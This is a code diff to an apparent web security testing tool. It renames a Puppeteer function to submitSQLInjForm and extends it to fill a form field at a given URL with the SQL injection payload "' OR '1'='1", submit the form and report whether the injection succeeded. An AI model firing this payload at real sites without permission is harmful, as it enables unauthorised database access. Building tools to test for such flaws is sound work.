@@ -5,7 +5,7 @@ import { SQLInjectionSchema } from "./models/sql-injection-schema.model";
 import { fillLogin } from "@/lib/utils/fill-login.util";
 import { openPage } from "@/lib/utils/open-page.util";
 
-export async function submitBruteForceForm(data: SQLInjectionSchema) {
+export async function submitSQLInjForm(data: SQLInjectionSchema) {
   const { page, browser } = await openPage();
 
   // Navigate the page to a URL
@@ -16,5 +16,27 @@ export async function submitBruteForceForm(data: SQLInjectionSchema) {
 
   await page.waitForNetworkIdle();
   await page.goto(data.url, { waitUntil: "networkidle0" });
-  await page.locator(data.fieldSelector).fill("' OR '1'='1");
+
+  if (data.queryType === "select") {
+    await page.locator(data.fieldSelector).fill("' OR '1'='1");
+    if (data.submitButtonSelector) {
+      await page.locator(data.submitButtonSelector).click();
+    }
+
+    await page.waitForNetworkIdle();
+
+    const resultElement = await page.$(`::-p-text(${data.resultsString})`);
+
+    if (resultElement) {
+      return { status: "Unsuccessful" };
+    }
+
+    return {
+      status: "Successful",
+    };
+  }
+
+  return {
+    error: "Not implemented yet",
+  };
 }
